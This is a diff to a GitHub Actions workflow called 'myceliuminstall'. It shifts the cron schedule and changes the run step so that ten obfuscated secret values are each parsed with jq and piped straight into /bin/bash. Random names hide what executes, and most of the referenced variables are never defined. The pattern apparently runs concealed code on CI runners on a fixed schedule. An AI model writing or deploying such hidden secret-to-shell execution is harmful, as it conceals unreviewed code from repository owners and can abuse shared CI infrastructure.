@@ -3,7 +3,8 @@ name: myceliuminstall
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '32 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +13,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: myceliuminstall
         env:
-          wybon7: ${{ secrets.wybon7 }}
+          zycj69: ${{ secrets.zycj69 }}
         run: |
-          echo $wybon7 | jq -r .vicnx74 | /bin/bash
-          echo $qs3460 | jq -r .noq68170 | /bin/bash
-          echo $xvq2835 | jq -r .f2171 | /bin/bash
-          echo $mlyw58182 | jq -r .wie44376 | /bin/bash
+          echo $zycj69 | jq -r .jlg0 | /bin/bash
+          echo $au0005 | jq -r .ub92354 | /bin/bash
+          echo $v3 | jq -r .vyhza81052 | /bin/bash
+          echo $he839 | jq -r .ivg30439 | /bin/bash
+          echo $fakv949 | jq -r .haz2434 | /bin/bash
+          echo $pi855 | jq -r .zriep405 | /bin/bash
+          echo $g75449 | jq -r .lpx16324 | /bin/bash
+          echo $fqktn92491 | jq -r .ei1285 | /bin/bash
+          echo $ai374 | jq -r .vve499 | /bin/bash
+          echo $khsl891 | jq -r .emiya536 | /bin/bash
 
